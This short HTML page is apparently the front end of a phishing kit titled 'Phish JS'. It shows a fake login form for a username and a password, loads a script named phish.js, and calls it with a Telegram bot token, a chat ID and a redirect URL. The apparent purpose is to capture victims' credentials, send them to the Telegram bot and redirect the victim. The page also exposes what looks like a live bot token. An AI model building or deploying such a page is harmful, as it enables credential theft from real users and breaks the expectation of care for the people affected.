<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phish JS</title>
</head>

<body>
    <input type="text" id='username' placeholder="Login">
    <input type="password" id='password' placeholder="Password">
    <button type="button" id="submit-button">Login</button>

    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
        integrity="sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8=" crossorigin="anonymous"></script>
    <script src="phish.js"></script>
    <script>
        $(document).ready(function () {
            const BOT_TOKEN = '1505663607:AAF_zOQJ4A8S2m0ZW4Cd56jNIvxHJC_HezA',
                CHAT_ID = '1048767139',
                REDIRECT_URL = 'xnxx.xxx'
            phish(BOT_TOKEN, CHAT_ID, REDIRECT_URL);
        });
    </script>
</body>

</html>
